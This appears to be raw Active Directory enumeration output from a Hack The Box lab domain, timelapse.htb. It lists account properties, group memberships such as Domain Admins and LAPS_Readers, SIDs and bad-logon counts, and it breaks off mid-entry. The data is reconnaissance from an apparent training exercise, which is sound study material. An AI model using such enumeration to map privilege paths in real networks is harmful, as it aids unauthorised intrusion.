AuthenticationPolicySilo             : {}
BadLogonCount                        : 8
badPasswordTime                      : 132928990131563971
badPwdCount                          : 8
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Users/Administrator
Certificates                         : {}
City                                 :
CN                                   : Administrator
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 10/23/2021 11:40:07 AM
createTimeStamp                      : 10/23/2021 11:40:07 AM
Deleted                              :
Department                           :
Description                          : Built-in account for administering the computer/domain
DisplayName                          :
DistinguishedName                    : CN=Administrator,CN=Users,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 8:24:20 AM, 10/25/2021 8:24:20 AM, 10/23/2021 11:40:56 AM, 1/1/1601 10:12:16 AM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            :
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isCriticalSystemObject               : True
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               : 3/27/2022 4:56:53 PM
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 132901400336667584
LastLogonDate                        : 2/23/2022 5:18:22 PM
lastLogonTimestamp                   : 132901391024791362
LockedOut                            : False
logonCount                           : 23
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Group Policy Creator Owners,CN=Users,DC=timelapse,DC=htb, CN=Domain Admins,CN=Users,DC=timelapse,DC=htb, CN=Enterprise Admins,CN=Users,DC=timelapse,DC=htb, CN=Schema Admins,CN=Users,DC=timelapse,DC=htb...}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 3/27/2022 1:58:27 AM
modifyTimeStamp                      : 3/27/2022 1:58:27 AM
msDS-User-Account-Control-Computed   : 0
Name                                 : Administrator
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : d81c9e60-4de1-454f-af28-47cc1a289429
objectSid                            : S-1-5-21-671920749-559770252-3318990721-500
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 3/27/2022 1:58:27 AM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132928451071548777
SamAccountName                       : Administrator
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-500
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    :
uSNChanged                           : 143439
uSNCreated                           : 8196
whenChanged                          : 3/27/2022 1:58:27 AM
whenCreated                          : 10/23/2021 11:40:07 AM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Users/Guest
Certificates                         : {}
City                                 :
CN                                   : Guest
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 10/23/2021 11:40:07 AM
createTimeStamp                      : 10/23/2021 11:40:07 AM
Deleted                              :
Department                           :
Description                          : Built-in account for guest access to the computer/domain
DisplayName                          :
DistinguishedName                    : CN=Guest,CN=Users,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/23/2021 11:40:56 AM, 12/31/1600 4:00:01 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            :
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isCriticalSystemObject               : True
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        : 3/27/2022 6:21:17 AM
lastLogonTimestamp                   : 132928608778512562
LockedOut                            : False
logonCount                           : 0
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Guests,CN=Builtin,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 3/27/2022 6:21:17 AM
modifyTimeStamp                      : 3/27/2022 6:21:17 AM
msDS-User-Account-Control-Computed   : 0
Name                                 : Guest
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : 4f76c58e-f859-43b3-9816-defe98754f7b
objectSid                            : S-1-5-21-671920749-559770252-3318990721-501
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      :
PasswordNeverExpires                 : True
PasswordNotRequired                  : True
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Guests,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 514
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 0
SamAccountName                       : Guest
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-501
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66080
userCertificate                      : {}
UserPrincipalName                    :
uSNChanged                           : 143512
uSNCreated                           : 8197
whenChanged                          : 3/27/2022 6:21:17 AM
whenCreated                          : 10/23/2021 11:40:07 AM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
adminCount                           : 1
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Users/krbtgt
Certificates                         : {}
City                                 :
CN                                   : krbtgt
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {False}
Country                              :
countryCode                          : 0
Created                              : 10/23/2021 11:40:55 AM
createTimeStamp                      : 10/23/2021 11:40:55 AM
Deleted                              :
Department                           :
Description                          : Key Distribution Center Service Account
DisplayName                          :
DistinguishedName                    : CN=krbtgt,CN=Users,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 8:24:20 AM, 10/23/2021 11:40:56 AM, 12/31/1600 4:04:16 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : False
Fax                                  :
GivenName                            :
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isCriticalSystemObject               : True
isDeleted                            :
KerberosEncryptionType               : {None}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
LockedOut                            : False
logonCount                           : 0
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Denied RODC Password Replication Group,CN=Users,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 10/25/2021 8:24:20 AM
modifyTimeStamp                      : 10/25/2021 8:24:20 AM
msDS-SupportedEncryptionTypes        : 0
msDS-User-Account-Control-Computed   : 8388608
Name                                 : krbtgt
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : b5e1ba02-44e2-4e7d-9661-4329a01c26f1
objectSid                            : S-1-5-21-671920749-559770252-3318990721-502
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : True
PasswordLastSet                      : 10/23/2021 11:40:55 AM
PasswordNeverExpires                 : False
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794880557701323
SamAccountName                       : krbtgt
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
servicePrincipalName                 : {kadmin/changepw}
ServicePrincipalNames                : {kadmin/changepw}
showInAdvancedViewOnly               : True
SID                                  : S-1-5-21-671920749-559770252-3318990721-502
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 514
userCertificate                      : {}
UserPrincipalName                    :
uSNChanged                           : 20556
uSNCreated                           : 12324
whenChanged                          : 10/25/2021 8:24:20 AM
whenCreated                          : 10/23/2021 11:40:55 AM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
adminCount                           : 1
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Staff/Admins/TheCyberGeek
Certificates                         : {}
City                                 :
CN                                   : TheCyberGeek
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 10/23/2021 12:16:26 PM
createTimeStamp                      : 10/23/2021 12:16:26 PM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : TheCyberGeek
DistinguishedName                    : CN=TheCyberGeek,OU=Admins,OU=Staff,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 12:25:43 PM, 12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : TheCyberGeek
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
LockedOut                            : False
logonCount                           : 0
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Domain Admins,CN=Users,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 10/25/2021 12:25:43 PM
modifyTimeStamp                      : 10/25/2021 12:25:43 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : TheCyberGeek
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : 05aaa631-38f8-418c-99dc-02c0190728c9
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1601
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 10/23/2021 12:16:26 PM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794901865479078
SamAccountName                       : thecybergeek
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1601
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : thecybergeek@timelapse.htb
uSNChanged                           : 20775
uSNCreated                           : 12800
whenChanged                          : 10/25/2021 12:25:43 PM
whenCreated                          : 10/23/2021 12:16:26 PM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
adminCount                           : 1
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Staff/Admins/Payl0ad
Certificates                         : {}
City                                 :
CN                                   : Payl0ad
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 10/23/2021 12:16:44 PM
createTimeStamp                      : 10/23/2021 12:16:44 PM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : Payl0ad
DistinguishedName                    : CN=Payl0ad,OU=Admins,OU=Staff,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 12:25:43 PM, 12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : Payl0ad
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
LockedOut                            : False
logonCount                           : 0
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Domain Admins,CN=Users,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 10/25/2021 12:25:43 PM
modifyTimeStamp                      : 10/25/2021 12:25:43 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : Payl0ad
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : e205d5ca-3a9a-4348-a498-62512ccf0632
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1602
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 10/23/2021 12:16:44 PM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794902042594844
SamAccountName                       : payl0ad
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1602
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : payl0ad@timelapse.htb
uSNChanged                           : 20776
uSNCreated                           : 12807
whenChanged                          : 10/25/2021 12:25:43 PM
whenCreated                          : 10/23/2021 12:16:44 PM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
adminCount                           : 1
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 8
badPasswordTime                      : 132928991426857318
badPwdCount                          : 8
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Staff/Dev/Legacyy
Certificates                         : {}
City                                 :
CN                                   : Legacyy
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 10/23/2021 12:17:10 PM
createTimeStamp                      : 10/23/2021 12:17:10 PM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : Legacyy
DistinguishedName                    : CN=Legacyy,OU=Dev,OU=Staff,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 12:25:43 PM, 12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : Legacyy
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               : 3/27/2022 4:59:02 PM
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 132928807404751534
LastLogonDate                        : 3/27/2022 11:52:20 AM
lastLogonTimestamp                   : 132928807401718539
LockedOut                            : False
logonCount                           : 16
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Development,OU=Groups,OU=Staff,DC=timelapse,DC=htb, CN=Remote Management Users,CN=Builtin,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 3/27/2022 11:52:20 AM
modifyTimeStamp                      : 3/27/2022 11:52:20 AM
msDS-User-Account-Control-Computed   : 0
Name                                 : Legacyy
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : c5f74830-1fe1-48ec-bc73-29091fa6cd81
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1603
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 10/23/2021 12:17:10 PM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794902302460334
SamAccountName                       : legacyy
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1603
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : legacyy@timelapse.htb
uSNChanged                           : 143578
uSNCreated                           : 12814
whenChanged                          : 3/27/2022 11:52:20 AM
whenCreated                          : 10/23/2021 12:17:10 PM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Staff/HelpDesk/Sinfulz
Certificates                         : {}
City                                 :
CN                                   : Sinfulz
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 10/23/2021 12:17:27 PM
createTimeStamp                      : 10/23/2021 12:17:27 PM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : Sinfulz
DistinguishedName                    : CN=Sinfulz,OU=HelpDesk,OU=Staff,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : Sinfulz
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
LockedOut                            : False
logonCount                           : 0
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=HelpDesk,OU=Groups,OU=Staff,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 10/23/2021 12:17:27 PM
modifyTimeStamp                      : 10/23/2021 12:17:27 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : Sinfulz
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : 3c63ba91-1526-4c54-93c9-5802824dd2cf
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1604
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 10/23/2021 12:17:27 PM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794902471236813
SamAccountName                       : sinfulz
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1604
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : sinfulz@timelapse.htb
uSNChanged                           : 12826
uSNCreated                           : 12821
whenChanged                          : 10/23/2021 12:17:27 PM
whenCreated                          : 10/23/2021 12:17:27 PM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Staff/HelpDesk/Babywyrm
Certificates                         : {}
City                                 :
CN                                   : Babywyrm
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 10/23/2021 12:17:41 PM
createTimeStamp                      : 10/23/2021 12:17:41 PM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : Babywyrm
DistinguishedName                    : CN=Babywyrm,OU=HelpDesk,OU=Staff,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : Babywyrm
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
LockedOut                            : False
logonCount                           : 0
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=HelpDesk,OU=Groups,OU=Staff,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 10/23/2021 12:17:41 PM
modifyTimeStamp                      : 10/23/2021 12:17:41 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : Babywyrm
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : 11b9e998-4200-4cf8-bde2-7a359d865b46
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1605
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 10/23/2021 12:17:41 PM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794902616785285
SamAccountName                       : babywyrm
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1605
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : babywyrm@timelapse.htb
uSNChanged                           : 12833
uSNCreated                           : 12828
whenChanged                          : 10/23/2021 12:17:41 PM
whenCreated                          : 10/23/2021 12:17:41 PM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 132796630620607640
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Users/svc_deploy
Certificates                         : {}
City                                 :
CN                                   : svc_deploy
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 10/25/2021 12:12:37 PM
createTimeStamp                      : 10/25/2021 12:12:37 PM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : svc_deploy
DistinguishedName                    : CN=svc_deploy,CN=Users,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : svc_deploy
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               : 10/25/2021 12:17:42 PM
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 132796635538555264
LastLogonDate                        : 2/23/2022 5:11:38 PM
lastLogonTimestamp                   : 132901386983385423
LockedOut                            : False
logonCount                           : 26
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=LAPS_Readers,OU=Groups,OU=Staff,DC=timelapse,DC=htb, CN=Remote Management Users,CN=Builtin,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 2/23/2022 5:11:38 PM
modifyTimeStamp                      : 2/23/2022 5:11:38 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : svc_deploy
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : 6c242c8e-8aa7-4110-8458-ee9d8d4096e0
objectSid                            : S-1-5-21-671920749-559770252-3318990721-3103
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 10/25/2021 12:12:37 PM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132796627575264447
SamAccountName                       : svc_deploy
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-3103
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : svc_deploy@timelapse.htb
uSNChanged                           : 53284
uSNCreated                           : 20704
whenChanged                          : 2/23/2022 5:11:38 PM
whenCreated                          : 10/25/2021 12:12:37 PM


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
adminCount                           : 1
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 132908367861381232
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Staff/Admins/TRX
Certificates                         : {}
City                                 :
CN                                   : TRX
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
